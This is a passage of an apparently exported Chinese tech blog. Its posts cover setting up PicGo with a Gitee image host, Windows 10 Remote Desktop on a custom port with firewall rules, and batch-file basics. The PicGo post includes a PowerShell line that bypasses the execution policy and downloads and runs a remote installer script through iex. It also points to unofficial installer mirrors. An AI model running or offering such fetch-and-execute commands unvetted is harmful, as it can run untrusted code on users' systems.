href="https://segmentfault.com/a/1190000016223897" target="_blank" rel="noopener">LSB图片隐写</a></p><p><a href="https://blog.csdn.net/qq_28697571/article/details/72353358" target="_blank" rel="noopener">LSB隐写算法</a></p>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法分析 </tag>
            
            <tag> 程序设计 </tag>
            
            <tag> LSB </tag>
            
            <tag> 隐写 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记PicGO图床的安装与使用</title>
      <link href="/2020/08/27/ji-picgo-tu-chuang-de-an-zhuang-yu-shi-yong/"/>
      <url>/2020/08/27/ji-picgo-tu-chuang-de-an-zhuang-yu-shi-yong/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-起因"><a href="#0x01-起因" class="headerlink" title="0x01 起因"></a>0x01 起因</h1><p>​        我有使用<a href="https://www.typora.io/" target="_blank" rel="noopener">Typora</a>做Blog的习惯，咱也不具体说Typora是一款<strong>完全免费</strong>、<strong>跨平台</strong>并且支持<strong>实时预览</strong>的Markdown文本编辑器。Typora支持图片插入，但不同的博客平台都有自己图片存储方式，使用Typora完成的Blog其中使用的图片是本地的可能就会很麻烦（我直接就是这样的<code>*_*</code>）。后来了解到图床的概念，就想实现类似的功能，来减少其中不必要的繁琐步骤。</p><h1 id="0x02-Markdown图床"><a href="#0x02-Markdown图床" class="headerlink" title="0x02 Markdown图床"></a>0x02 Markdown图床</h1><h2 id="什么是图床"><a href="#什么是图床" class="headerlink" title="什么是图床"></a>什么是图床</h2><p>​        <strong><a href="[https://baike.baidu.com/item/%E5%9B%BE%E5%BA%8A/10721348?fr=aladdin](https://baike.baidu.com/item/图床/10721348?fr=aladdin)">图床</a></strong>就是一个存储图片的服务器，常以URL的形式来供其他平台获取图片。说白了就是将图片存储在一个服务器上，再需要其中的一个或一些图片时通过HTTP请求或其他方式获取图片的信息。服务器的选择主要分为两种可以自己搭建，也可以使用别人搭建好后提供的服务。自己搭建肯定花钱，别人搭建给你提供服务，有的收费，有的一定范围内不收费，有的完全免费。</p><blockquote><p><strong>为啥需要图床</strong></p><ul><li>在一定程度上可以缓解服务器压力，聚集性的访问请求会影响系统的性能，分散的访问请求一定程度上可以起到缓解作用。</li><li>起到一定的安全作用，主服务器被攻破图床服务器上的信息不会直接受到影响。</li><li>最主要的原因是访问速度，图片的加载在浏览器做渲染的比较耗时，如果服务器在国外加载的时间可能就会更长，影响体验效果。</li></ul></blockquote><h2 id="选择图床的依据"><a href="#选择图床的依据" class="headerlink" title="选择图床的依据"></a>选择图床的依据</h2><ul><li><p><code>可靠性</code>。数据在当今社会是最宝贵的财富之一，因此在选择存储的服务时，可靠性无疑是首要的考虑因素。</p></li><li><p><code>安全性</code>。面对攻击、盗取和破坏时如何保障数据不受到损失，是另一个重要的考虑因素。</p></li><li><p><code>是否简单易用</code>。越简单易用越好。</p></li><li><p><code>价格是否合理</code>。在满足前两条的情况下，越便宜越好，最好免费。</p></li></ul><h2 id="图床选择方案"><a href="#图床选择方案" class="headerlink" title="图床选择方案"></a>图床选择方案</h2><ol><li><a href="https://www.getnas.com/what-is-oss/" target="_blank" rel="noopener">对象存储</a>图床<ul><li>国外的有amazon s3 和google storage等</li><li>国内的有七牛云、又拍云、腾讯云、阿里云、天翼云等</li></ul></li><li>第三方图床<ul><li><a href="https://sm.ms/" target="_blank" rel="noopener">sm.ms</a>：<ul><li>免费版存储容量5GB。</li><li>每分钟限制上传20张，每小时限制上传100张，每天限制上传200张，每周限制上传500张，每月限制上传1000张。</li><li>单张图片最大5M。</li><li>不支持相册，找图片需要用搜索功能</li></ul></li><li><a href="https://imgchr.com/" target="_blank" rel="noopener">imgchr</a>：<ul><li>免费版存储容量不限。</li><li>每小时限制上传30张，每天限制上传次数为120次。</li><li>单张图片最大10M。</li><li>支持相册。仅限于非商用。</li></ul></li><li><a href="https://www.superbed.cn" target="_blank" rel="noopener">聚合图床</a>：<ul><li>将图片分发到多处备份，借助其本身的CDN加速功能，节省服务器流量，并且不用担心图片被删除，即便其中某几个图床上的图片被删除了，还有其他备份，保证万无一失。</li><li>支持匿名和注册管理。</li><li>免费版无API支持，跳转链接无法保证永久有效，若链接失效需要您重新上传获取新链接。</li><li>最多存1000张。</li><li>单张图片大小5M。</li><li>不支持相册。</li></ul></li></ul></li><li>云盘图床<ul><li>云盘一般都是文件系统存储，通过分享等方式获得上传图片的外链即可，但是获得的<strong>外链不能含有密码</strong>，有密码无法直接访问图片。</li></ul></li><li>社交网站图床<ul><li>新浪微博：<a href="https://jingyan.baidu.com/article/46650658feb199f549e5f8fb.html" target="_blank" rel="noopener">新浪图床怎么用</a>、<a href="https://www.zhihu.com/question/19876644?sort=created" target="_blank" rel="noopener">可以把新浪微博作为图床使用吗？</a>(2019年4月25日微博使用Referer值进行防盗链设置)</li><li>qq空间：<a href="https://www.zhihu.com/question/37688721" target="_blank" rel="noopener">图床使用QQ空间会出现问题吗？</a></li></ul></li><li>云笔记图床<ul><li>印象笔记：<a href="https://zhuanlan.zhihu.com/p/73283533" target="_blank" rel="noopener">使用印象笔记作为图床</a></li><li>有道云笔记：<a href="https://baijiahao.baidu.com/s?id=1632687069476377425&wfr=spider&for=pc" target="_blank" rel="noopener">使用有道云笔记作为图床</a></li></ul></li><li>代码托管网站图床<ul><li>GitHub：<a href="https://www.cnblogs.com/ly-2019/p/11828790.html" target="_blank" rel="noopener">使用GitHub搭建图床</a></li><li>Gitee：<a href="https://www.jianshu.com/p/b69950a49ae2" target="_blank" rel="noopener">PicGO+Gitee实现markdown图床</a></li></ul></li><li>自建图床<ul><li>自建图片服务器，顾名思义就是自己花钱购买服务器来搭建用来存储图片的服务。github有一个开源的图片服务Cheverto，可以用来搭建自己的图床。<ul><li><a href="https://chevereto.com/free" target="_blank" rel="noopener">Cheverto官网</a></li><li><a href="https://github.com/Chevereto/Chevereto-Free" target="_blank" rel="noopener">Cheverto-GitHub地址</a></li><li><a href="https://www.jianshu.com/p/7863fcb34aed" target="_blank" rel="noopener">如何搭建一个自己图床网站</a></li></ul></li></ul></li><li>区块链存储图床<ul><li>IPFS</li></ul></li></ol><h1 id="0x03-图床工具"><a href="#0x03-图床工具" class="headerlink" title="0x03 图床工具"></a>0x03 图床工具</h1><p>​        图床工具，就是自动把本地图片上传到图床并转换成链接的一款工具，网络上有很多图床工具。</p><ul><li><strong><a href="https://molunerfinn.com/PicGo/" target="_blank" rel="noopener">PicGo</a></strong>：是比较出名的一款图床工具了，它的界面友好，支持的图床也多，还可以在本地对图片进行管理，支持拖拽上传，使用很方便。如果你有自己使用的图床，它是一款用 <code>Electron-vue</code> 开发的软件，目前v2.3版可以支持七牛图床，腾讯云COS，又拍云，GitHub，阿里云OSS，SM.MS，阿里云OSS、Imgur 等8种常用图床。</li><li><strong><a href="http://mpic.lzhaofu.cn/" target="_blank" rel="noopener">Mpic</a></strong>：如果你使用的图床是七牛云，那么Mpic这款软件推荐给你，软件很小，支持图片拖拽上传、截图上床，功能简单专一，支持多种链接复制，只是目前只支持七牛云。<ul><li><a href="https://www.cnblogs.com/xuwei1/p/11278488.html" target="_blank" rel="noopener">七牛云+Mpic-图床神器搭建</a></li></ul></li><li><a href="https://getsharex.com/" target="_blank" rel="noopener"><strong>ShareX</strong></a>：是一块功能强大的截图工具，从截图、处理截图（比如调整大小）到上传截图然后复制链接，一步到位。只不过ShareX的入门门槛比较高，需要进行相对复杂的设置，但是设置之后就可以起飞了。</li><li><a href="https://github.com/klesh/fu/releases" target="_blank" rel="noopener"><strong>fu</strong></a>：是一款简单的图片上传工具，可以将剪切板的图片直接上传，支持多种链接的复制，还可以自己配置图床，软件很简单。</li><li><a href="https://www.getquicker.net/" target="_blank" rel="noopener"><strong>quicker</strong></a>：和上面的软件们并不是同类，他是一款windows下的效率神器，它可以快速的打开你电脑上的任何软件、文件等，还可以帮你做很多机械重复的电脑操作，可以结合everything快速检索文件，可以结合snipaste进行图片处理，可以执行自定义的脚本，总之非常好用，他有丰富的动作库，可以使用现成的动作，如果库里面没有你也可以直接实现新的动作，非常灵活，比如本次要提到的图片上传图床就有现成的动作，叫做SM.MS图床。</li><li><a href="https://code.visualstudio.com/" target="_blank" rel="noopener"><strong>vscode</strong></a>：如果你是用vscode写markdown的，那么强烈推荐picgo插件，简直完美。<ul><li><a href="https://www.jianshu.com/p/cb8d2194d5ef" target="_blank" rel="noopener">vscode作为Markdown编辑器</a></li></ul></li></ul><h1 id="0x04-我的选择"><a href="#0x04-我的选择" class="headerlink" title="0x04 我的选择"></a>0x04 我的选择</h1><ul><li>没钱</li><li>图床主要用作Blog不做隐私图片存储之用</li><li>操作简单能和Typora完美搭配</li><li>主要访问流量来自国内</li></ul><p>综上情况选择的方式为：<code>Typora + PicGo + Gitee</code></p><h1 id="0x05-开始安装"><a href="#0x05-开始安装" class="headerlink" title="0x05 开始安装"></a>0x05 开始安装</h1><h2 id="Typora安装"><a href="#Typora安装" class="headerlink" title="Typora安装"></a>Typora安装</h2><p><a href="https://www.typora.io/" target="_blank" rel="noopener">Typora</a>安装轻参考<a href="https://www.cnblogs.com/zhangdadayou/p/11114385.html" target="_blank" rel="noopener">Typora安装及使用</a>。</p><h2 id="PicGo安装"><a href="#PicGo安装" class="headerlink" title="PicGo安装"></a>PicGo安装</h2><p>PicGo官网：<a href="https://molunerfinn.com/PicGo/" target="_blank" rel="noopener">https://molunerfinn.com/PicGo/</a></p><p>​        PicGo编译好的.exe文件在GitHub上，所以可以在GitHub上直接下载，但是在GitHub上下载有一个最大的问题就是网速。</p><div align="center">    <img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/software/picgo/github下载picgo.png"></div><p>大半天了才下这么一丢丢。</p><p>​        找了一下PicGO的其他安装方式，是<code>Readme.md</code>文件中看到可以使用<a href="https://chocolatey.org/" target="_blank" rel="noopener">Chocolatey</a>方式安装PicGO。</p><p><strong>Chocolatey安装</strong></p><ul><li><p>PowerShell管理员权限运行</p></li><li><p>检查：</p><ul><li><pre class=" language-powershell"><code class="language-powershell"><span class="token function">PS</span> C:\> Get<span class="token operator">-</span>ExecutionPolicy</code></pre></li><li><p>如果返回的是 <code>Restricted</code>，那么需要更改为<code>Bypass</code>或<code>AllSigned</code></p></li></ul></li><li><p>更改：</p><ul><li><pre class=" language-powershell"><code class="language-powershell"><span class="token function">PS</span> C:\> <span class="token function">Set</span><span class="token operator">-</span>ExecutionPolicy AllSigned</code></pre><p>或</p></li><li><pre class=" language-powershell"><code class="language-powershell"><span class="token function">PS</span> C:\> <span class="token function">Set</span><span class="token operator">-</span>ExecutionPolicy Bypass <span class="token operator">-</span>Scope <span class="token keyword">Process</span></code></pre></li></ul></li><li><p>安装：</p><ul><li><p>设置<code>执行策略</code>同时下载并执行安装脚本</p></li><li><pre class=" language-powershell"><code class="language-powershell"><span class="token function">PS</span> C:\> <span class="token function">Set</span><span class="token operator">-</span>ExecutionPolicy Bypass <span class="token operator">-</span>Scope <span class="token keyword">Process</span> <span class="token operator">-</span>Force<span class="token punctuation">;</span> <span class="token function">iex</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">New-Object</span> System<span class="token punctuation">.</span>Net<span class="token punctuation">.</span>WebClient<span class="token punctuation">)</span><span class="token punctuation">.</span>DownloadString<span class="token punctuation">(</span><span class="token string">'https://chocolatey.org/install.ps1'</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre></li><li><p>如果执行策略已经更改，直接下载并执行也可以</p></li><li><pre class=" language-powershell"><code class="language-powershell"><span class="token function">PS</span> C:\> <span class="token function">iex</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">New-Object</span> System<span class="token punctuation">.</span>Net<span class="token punctuation">.</span>WebClient<span class="token punctuation">)</span><span class="token punctuation">.</span>DownloadString<span class="token punctuation">(</span><span class="token string">'https://chocolatey.org/install.ps1'</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre></li></ul></li><li><p>等待安装完成，之后可以使用 <code>choco version</code> 查看安装结果。</p><div align="center">    <img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/software/picgo/查看Chocolatey版本信息.png"></div></li></ul><p><strong>使用Chocolatey安装PicGO</strong>：</p><div align="center">    <img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/software/picgo/Chocolatey下载picgo超时.png"></div><p>又是因为连接超时。(´;︵;`)</p><ul><li>还是直接找一个安装包用吧。</li></ul><div align="center">    <img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/software/picgo/picgo下载搜索.png"></div><ul><li>有一个自称是官方版本的PicGO下载一个看看。</li></ul><div align="center">    <img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/software/picgo/PicGo-下载之家.png"></div><ul><li>下载完了查一下毒。</li></ul><div align="center">    <img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/software/picgo/VirusTotal查picgo.png"></div><p>这比自己写的工具还纯净(๑˙ー˙๑)。</p><ul><li>直接傻瓜式安装（路径可以自己指定）安装之后打开主界面。</li></ul><div align="center">    <img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/software/picgo/PicGo主界面.png"></div><ul><li>安装Gitee插件（下面两个插件都可以使用）</li></ul><div align="center">    <img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/software/picgo/安装Gitee插件.png"></div><ul><li>Gitee图床设置</li></ul><div align="center">    <img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/software/picgo/Gitee图床设置.png"></div><ul><li>在码云上创建一个对应的项目用来存储图片，在设置-》私人令牌中获取token（获取的token只以明文形式展示一次）</li></ul><h1 id="0x06-使用问题"><a href="#0x06-使用问题" class="headerlink" title="0x06 使用问题"></a>0x06 使用问题</h1><p>​        在正常使用PicGo上传图床时，经常遇到</p><div align="center">    <img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/software/picgo/picgo.png"></div><p>​        首先确定了配置没有问题，而且文件也没有问题，那就是PicGo出现了问题，重启应用继续尝试，就可以上传成功，目前还不知道具体是什么原因。</p><p>（<font color="red">新版图床已修复此问题，感觉旧版本的bug实在不舒服，就重新安装了2.3.0版，附百度云下载链接<a href="https://pan.baidu.com/s/1KxGL8dhxfC2lwY02p_CqIQ" target="_blank" rel="noopener">PicGo-Setup-2.3.0-beta.0</a>，提取码:dtpu</font>）</p><h1 id="0x07-参考链接"><a href="#0x07-参考链接" class="headerlink" title="0x07 参考链接"></a>0x07 参考链接</h1><ul><li><p><a href="https://www.jianshu.com/p/ea1eb11db63f" target="_blank" rel="noopener">markdown图床</a></p></li><li><p><a href="https://www.jianshu.com/p/9d91355e8418" target="_blank" rel="noopener">图床工具的使用——PicGo</a></p></li><li><p><a href="https://www.jianshu.com/p/bff6638e450f" target="_blank" rel="noopener">图床工具推荐</a></p></li><li><p><a href="https://www.jianshu.com/p/b8b618484d0d" target="_blank" rel="noopener">Chocolatey安装与卸载</a></p></li><li><p><a href="https://www.jianshu.com/p/b69950a49ae2" target="_blank" rel="noopener">PicGo + Gitee(码云)实现markdown图床</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 软件使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PicGo </tag>
            
            <tag> 软件使用 </tag>
            
            <tag> 图床 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Win10远程桌面及防火墙配置</title>
      <link href="/2020/08/26/win10-yuan-cheng-zhuo-mian-ji-fang-huo-qiang-pei-zhi/"/>
      <url>/2020/08/26/win10-yuan-cheng-zhuo-mian-ji-fang-huo-qiang-pei-zhi/</url>
      
        <content type="html"><![CDATA[<h1 id="远程桌面"><a href="#远程桌面" class="headerlink" title="远程桌面"></a>远程桌面</h1><p>&emsp;&emsp;当计算机开启了<strong>远程桌面</strong>连接后，可以通过另一台计算机中的<strong>远程桌面客户端程序</strong>连接到该计算机，在计算机上进行实时操作，如：安装程序、执行程序等。远程桌面抛开了地域的限制，使用户操作远端计算机犹如操作当前计算机一般。</p><h1 id="操作环境"><a href="#操作环境" class="headerlink" title="操作环境"></a>操作环境</h1><ul><li>Windows 10专业版</li><li>系统自带的<strong>远程桌面</strong></li></ul><p>ps:</p><ul><li>Windows 10操作系统中家庭版仅能作<strong>客户端</strong>，而专业版和企业版<strong>既可以作客户端又可以作服务端</strong>。</li><li>不使用<strong>TeamViewer</strong>的原因是：TeamViewer需要两台计算机都连接到Internet上，而我现在要实现的是，内网中的两台计算机可以实现远程桌面访问。</li></ul><h1 id="操作目的"><a href="#操作目的" class="headerlink" title="操作目的"></a>操作目的</h1><p>&emsp;&emsp;实现内网中的两台计算机可以通过远程桌面访问。</p><h1 id="操作步骤"><a href="#操作步骤" class="headerlink" title="操作步骤"></a>操作步骤</h1><p>&emsp;&emsp;Windows 10专业版默认是禁掉远程桌面服务端的功能，使用远程桌面时，需要先开启。远程桌面默认使用的是<strong>3389</strong>端口，但开启远程桌面时，不建议采用此端口，应修改成另一个不常用的端口，此时也要在Windows Defender 防火墙中对新设置的端口进行<strong>规则设置</strong>（<em>有的教程中，在开启远程桌面时，为了连接顺畅直接把防火墙给关了……建议还是不要采取这样的操作</em>）。下面将从<strong>开启远程桌面</strong>、<strong>修改远程桌面端口</strong>、<strong>修改防火墙配置</strong>、<strong>远程桌面连接</strong>这四个方面来叙述。</p><h2 id="开启远程桌面"><a href="#开启远程桌面" class="headerlink" title="开启远程桌面"></a>开启远程桌面</h2><p>&emsp;&emsp;Win10中有两种常用方式可以开启远程桌面。</p><h3 id="方式一：通用型"><a href="#方式一：通用型" class="headerlink" title="方式一：通用型"></a>方式一：通用型</h3><p>&emsp;&emsp;此方式适用于绝大多数Windows版本系统。</p><ol><li><p>右键【<strong>此电脑</strong>】选择【<strong>属性</strong>】，在<strong>系统</strong>界面中<strong>点击</strong>【<strong>远程设置</strong>】，如图1所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/mstsc/图1.png" alt="图1"></center><center>图 1</center></li><li><p>在<strong>远程属性界面</strong>中的<strong>远程桌面</strong>中，<strong>选中</strong>【允许远程连接到计算机】选项，然后<strong>点击</strong>【<strong>应用</strong>】按钮，如图2所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/mstsc/图2.png" alt="图2"></center><center>图 2</center></li><li><p><strong>点击</strong>【<strong>选择用户</strong>】按钮，进入<strong>远程桌面用户</strong>界面（系统默认仅当前管理员有远程访问权限，如需添加其他用户需继续执行下一步操作），如图3所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/mstsc/图3.png" alt="图3"></center><center>图 3</center></li><li><p><strong>点击</strong>【<strong>添加</strong>】按钮，进入<strong>选择用户界面</strong>，在输入框中键入用户名后，<strong>点击</strong>【<strong>确认</strong>】按钮即可，如图4所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/mstsc/图4.png" alt="图4"></center><center>图 4</center></li></ol><h3 id="方式二：Modern界面"><a href="#方式二：Modern界面" class="headerlink" title="方式二：Modern界面"></a>方式二：Modern界面</h3><p>&emsp;&emsp;Win10采用Modern设置风格，并且将一些常用的设置选项都集成到了【<strong>设置界面</strong>】。</p><ol><li><p>【Win+I】打开【<strong>设置界面</strong>】，点击【<strong>系统</strong>】 -&gt; 【<strong>远程桌面</strong>】，如图5所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/mstsc/图5.png" alt="图5"></center><center>图 5</center></li><li><p>将<strong>启用远程桌面</strong>设置为<strong>开</strong>，如图6所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/mstsc/图6.png" alt="图6"></center><center>图 6</center></li></ol><p>ps：</p><ul><li>上述操作与<strong><em>方式一</em></strong>中的前两步操作达到相同的效果。</li><li>该方式仅允许当前管理员进行远程访问操作。</li><li>设置接通电源时计算机从不睡眠，否则只会在某段时间内才能正常连接。</li></ul><h2 id="修改远程桌面默认端口"><a href="#修改远程桌面默认端口" class="headerlink" title="修改远程桌面默认端口"></a>修改远程桌面默认端口</h2><ol><li><p>【Win+R】打开【运行】，键入<strong>regedit</strong>，打开<strong>注册表编辑器界面</strong>，如图7所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/mstsc/图7.png" alt="图7"></center><center>图 7</center></li><li><p>修改<strong>PortNumber</strong>参数</p><ul><li><p>找到如下位置：<span style="color:red;">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp</span></p><p>在右侧找到<strong>PortNumber</strong>并将其修改为<strong>6700</strong>，如图8所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/mstsc/图8.png" alt="图8"></center><center>图 8</center></li><li><p>找到如下位置：</p><p><span style="color:red">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp</span></p><p>在右侧找到<strong>PortNumber</strong>并将其修改为<strong>6700</strong>，如图9所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/mstsc/图9.png" alt="图9"></center><center>图 9</center></li></ul></li><li><p>关闭注册表。</p></li></ol><h2 id="修改防火墙配置"><a href="#修改防火墙配置" class="headerlink" title="修改防火墙配置"></a>修改防火墙配置</h2><ol><li><p>【Win+R】打开【运行】，键入<strong>control</strong>,打开<strong>控制面板</strong>。找到<strong>Windows Defender 防火墙</strong>并打开，如图10所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/mstsc/图10.png" alt="图10"></center><center>图 10</center></li><li><p><strong>点击</strong>【<strong>高级设置</strong>】，打开<strong>高级安全Windows Defender 防火墙界面</strong>，如图11所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/mstsc/图11.png" alt="图11"></center><center>图 11</center></li><li><p><strong>点击</strong>左侧【<strong>入站规则</strong>】后，点击【<strong>新建规则</strong>】，如图12所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/mstsc/图12.png" alt="图12"></center><center>图 12</center></li><li><p>在<strong>新建入站规则向导界面</strong>的规则类型中选择<strong>端口</strong>选项，并单击【<strong>下一步</strong>】按钮，如图13所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/mstsc/图13.png" alt="图13"></center><center>图 13</center></li><li><p>在<strong>协议和端口界面</strong>选择<strong>TCP</strong>选项（入栈需要创建两条规则一个是TCP一个是UDP，所以还需要按此例创建一个UDP的），选中<strong>特定本地端口</strong>，并键入端口值：<strong>6700</strong>，并<strong>单击</strong>【<strong>下一步</strong>】按钮，如图14所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/mstsc/图14.png" alt="图14"></center><center>图 14</center></li><li><p>在<strong>操作界面</strong>中选择<strong>允许连接</strong>选项，如图15所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/mstsc/图15.png" alt="图15"></center><center>图 15</center></li><li><p><strong>配置文件界面</strong>规则采用默认即可，<strong>单击</strong>【<strong>下一步</strong>】，如图16所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/mstsc/图16.png" alt="图16"></center><center>图 16</center></li><li><p>在<strong>名称界面</strong>键入名称值，可随意设置只要自己懂什么意思就OK，如图17所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/mstsc/图17.png" alt="图17"></center><center>图 17</center></li><li><p>按上述相同步骤再新增一条<strong>UDP规则</strong>。</p></li><li><p>设置完毕后，关闭<strong>高级安全Windows Defender 防火墙界面</strong>。</p></li><li><p><span style="color:red">所有设置完成之后需要重启电脑</span></p></li></ol><h2 id="远程桌面连接"><a href="#远程桌面连接" class="headerlink" title="远程桌面连接"></a>远程桌面连接</h2><ol><li><p>【Win+R】打开【运行】，键入<strong>mstsc</strong>，打开<strong>远程桌面界面客户端</strong>，如图18所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/mstsc/图18.png" alt="图18"></center><center>图 18</center></li><li><p>键入计算机IP地址，记得要加上端口号(如：<span style="color:red">192.168.11.111:6700</span>，不加的话，默认是使用<strong>3389</strong>进行连接)，如图19所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/mstsc/图19.png" alt="图19"></center><center>图 19</center></li><li><p>成功后会要求用户键入<strong>密码</strong>，确认<strong>连接凭证</strong>即可登录。</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 软件使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
            <tag> mstsc </tag>
            
            <tag> 远程桌面 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>批处理笔记</title>
      <link href="/2020/08/22/pi-chu-li-bi-ji/"/>
      <url>/2020/08/22/pi-chu-li-bi-ji/</url>
      
        <content type="html"><![CDATA[<h1 id="批处理文件"><a href="#批处理文件" class="headerlink" title="批处理文件"></a>批处理文件</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul><li>批处理文件也称<strong>批处理程序</strong>或<strong>脚本</strong>，使用它可以<strong>简化日常或重复性任务</strong></li><li>批处理文件中常见是<strong>DOS批处理</strong>和<strong>PS批处理等</strong>（文中的批处理指的的DOS批处理）</li><li>DOS批处理文件是<strong>DOS命令</strong>的批量和技巧性的应用，体现了DOS的精华</li><li>批处理文件是无格式的<strong>文本文件</strong>，包含<strong>一条或多条命令</strong>，文件扩展名为<strong>.bat或.cmd</strong></li><li>批处理文件在被<strong>DOS</strong>或<strong>cmd</strong>执行时，会按照该文件中各个命令出现的<strong>顺序</strong>来逐个<strong>运行</strong></li></ul><h2 id="编写"><a href="#编写" class="headerlink" title="编写"></a>编写</h2><h3 id="copy命令"><a href="#copy命令" class="headerlink" title="copy命令"></a>copy命令</h3><p>​        copy命令是实现<strong>文件复制</strong>的命令，它可以将文件从某个目录复制到另外的目录。</p><p><strong>语法</strong>：</p><pre class=" language-batch"><code class="language-batch"><span class="token command"><span class="token keyword">copy</span> con 批处理文件名称.bat</span></code></pre><p><strong>说明</strong>：</p><ul><li>con：是指字符输入设备，通常指键盘</li></ul><p><strong>步骤</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/ProgrammingLanguages/Batch/批处理笔记/copy命令编写批处理文件.png" alt="copy命令编写批处理文件"></center><p>注：</p><ul><li>以<strong>【Ctrl + Z】</strong>组合键完成批处理文件的创建</li></ul><p><strong>结果</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/ProgrammingLanguages/Batch/批处理笔记/copy命令编写批处理文件展示结果.png" alt="copy命令编写批处理文件展示结果"></center><h3 id="edit命令"><a href="#edit命令" class="headerlink" title="edit命令"></a>edit命令</h3><p>​        Edit是<strong>DOS系统</strong>中的文本文件编辑程序，可以快速编辑批处理文件。</p><h3 id="记事本程序"><a href="#记事本程序" class="headerlink" title="记事本程序"></a>记事本程序</h3><ul><li>新建一个文本文件</li><li>用记事本打开文本文件，并在其中编写批处理命令</li><li>以<strong>.bat</strong>的后缀名的形式保存此文件</li></ul><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><ul><li>其他批处理命令编辑器主要指的是其他文本编辑器，如<strong>notepad++</strong>、<strong>EditPlus</strong>等等，他们类似于记事本程序，可以直接以文本的形式编辑批处理命令。如下图所示：</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/ProgrammingLanguages/Batch/批处理笔记/文本编辑器编写批处理文件.png" alt="文本编辑器编写批处理文件"></center><h1 id="批处理命令"><a href="#批处理命令" class="headerlink" title="批处理命令"></a>批处理命令</h1><h2 id="批处理基础命令"><a href="#批处理基础命令" class="headerlink" title="批处理基础命令"></a>批处理基础命令</h2><h3 id="echo"><a href="#echo" class="headerlink" title="echo"></a>echo</h3><p>​        打开或关闭<strong>命令回显</strong>功能或<strong>显示消息</strong></p><p><strong>语法</strong>：</p><pre class=" language-batch"><code class="language-batch"><span class="token command"><span class="token keyword">echo</span> [{on | off}] [message]</span></code></pre><p><strong>说明</strong>：</p><ul><li>{ on | off }：指定是否打开命令回显功能</li><li>message：指定要在屏幕上显示的文本信息</li></ul><p><strong>eg</strong>：</p><pre class=" language-batch"><code class="language-batch"><span class="token comment" spellcheck="true">:: 关闭回显功能</span><span class="token operator">@</span><span class="token command"><span class="token keyword">echo</span> off</span><span class="token comment" spellcheck="true">:: 在命令提示符窗口显示"Pleione_Plus"</span><span class="token command"><span class="token keyword">echo</span> By Pleione_Plus</span><span class="token comment" spellcheck="true">:: 显示一个空行</span><span class="token command"><span class="token keyword">echo</span>.</span><span class="token comment" spellcheck="true">:: 显示一个变量</span><span class="token command"><span class="token keyword">echo</span> <span class="token variable">%windir%</span></span><span class="token comment" spellcheck="true">:: 显示重定向到文件中</span><span class="token command"><span class="token keyword">echo</span> <span class="token string">"this is a demo!"</span> > tmp.txt</span></code></pre><p><strong>结果展示</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/ProgrammingLanguages/Batch/批处理笔记/echo-display.png" alt="echo-display"></center><h3 id="pause"><a href="#pause" class="headerlink" title="pause"></a>pause</h3><p>​        <strong>暂停</strong>批处理程序，直到有一个按键<strong>被触发</strong></p><p><strong>语法</strong>：</p><pre class=" language-batch"><code class="language-batch"><span class="token command"><span class="token keyword">pause</span></span></code></pre><p><strong>结果展示</strong>：</p><center><img 